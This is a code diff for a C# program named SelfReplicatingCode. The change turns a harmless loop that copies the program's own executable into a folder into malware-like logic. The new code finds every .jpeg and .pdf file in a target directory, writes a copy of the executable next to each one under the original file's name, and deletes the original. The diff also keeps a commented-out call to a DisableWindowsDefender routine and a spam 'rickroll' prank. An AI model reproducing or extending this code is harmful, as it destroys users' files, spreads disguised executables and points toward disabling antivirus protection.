@@ -7,12 +7,11 @@ namespace SelfReplicatingCode
 {
     class replicate
     {
-        private const int MAX_ITERATIONS = 20;
-
         static void Main(string[] args)
         {
             string fileName = Assembly.GetExecutingAssembly().Location;
-            string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "generated-files");
+            string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "target");
+            string[] targetExtensions = {".jpeg",".pdf"};
 
             // create the directory if it doesn't exist
             if (!Directory.Exists(directoryPath))
@@ -20,18 +19,21 @@ namespace SelfReplicatingCode
                 Directory.CreateDirectory(directoryPath);
             }
 
-            for (int i = 0; i < MAX_ITERATIONS; i++)
-            {
-                string newFileName = Path.Combine(directoryPath,
-                    Path.GetFileNameWithoutExtension(fileName) + i + Path.GetExtension(fileName));
-                File.Copy(fileName, newFileName, true);
+            // Copy the file to all files with the target extension
+            foreach (string extension in targetExtensions){
+                foreach (string targetFile in Directory.GetFiles(directoryPath, "*" + extension))
+                {
+                    string newFileName = Path.Combine(directoryPath, targetFile + Path.GetExtension(fileName));
+                    File.Copy(fileName, newFileName, true);
+                    File.Delete(Path.Combine(directoryPath, targetFile));
+                }
             }
 
             // DisableWindowsDefender(); // Disable Windows Defender
 
             // Alger(); // Insert in loop if you want to say alger everytime you replicate (spam)
 
-            PlayRickRoll(); // Insert in loop if you want to rickroll everytime you replicate (spam)
+            // PlayRickRoll(); // Insert in loop if you want to rickroll everytime you replicate (spam)
         }
 
         static void DisableWindowsDefender()
